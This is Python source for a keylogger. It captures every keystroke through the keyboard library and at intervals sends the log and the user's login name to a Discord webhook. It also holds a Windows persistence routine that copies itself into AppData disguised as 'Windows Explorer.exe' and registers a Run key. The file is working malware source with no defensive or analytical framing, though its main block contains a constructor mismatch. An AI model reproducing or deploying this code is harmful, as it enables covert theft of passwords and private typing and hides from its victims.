import keyboard,os
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed, webhook
import subprocess, shutil, sys, stat, platform, getpass
import shelve, os

SEND_REPORT_EVERY = 60
WEBHOOK = "discord webhook"

class Kl: 
    def __init__(self, interval, WEBHOOK):
        now = datetime.now()
        self.interval = interval
        self.report_method = "webhook"
        self.WEBHOOK = WEBHOOK
        self.log = ""
        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
        # Creates DB
        FILE = shelve.open('reports-shelve')
        FILE.close()

    def report_to_webhook(self):
        flag = False
        webhook = DiscordWebhook(url=self.WEBHOOK)
        if len(self.log) > 2000:
            flag = True
            path = os.environ["temp"] + "\\report.txt"
            with open(path, 'w+') as file:
                file.write(f"Report From {self.username} Time: {self.end_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='setup.txt')
        else:
            embed = DiscordEmbed(title=f"Report From ({self.username}) Time: {self.end_dt}", description=self.log)
            webhook.add_embed(embed) 
        webhook.execute()
        try:
            FILE = shelve.open('reports-shelve')
            REPORTS = (FILE['reports'])
            FILE.close()
            embed = DiscordEmbed(title=f"Report From ({self.username}) Time: {self.end_dt}", description=REPORTS)
            webhook.add_embed(embed) 
            webhook.execute() 
        except:
            pass
        if flag:
            os.remove(path)

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()
        FILE = shelve.open('reports-shelve')
        os.chdir(os.path.dirname(__file__))
        aaaaa = os.getcwd()
        FILE['reports'] = self.log + aaaaa
        FILE.close()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
    
    def become_persistent(self):
        if sys.platform.startswith("win"):
            self.become_persistent_on_windows()

    def become_persistent_on_windows(self):
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + file_location + '"', shell=True)

    def chmod_to_exec(self, file):
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)





if __name__ == "__main__":
    Kl = Kl(interval=SEND_REPORT_EVERY, report_method="webhook")    
    Kl.start()
































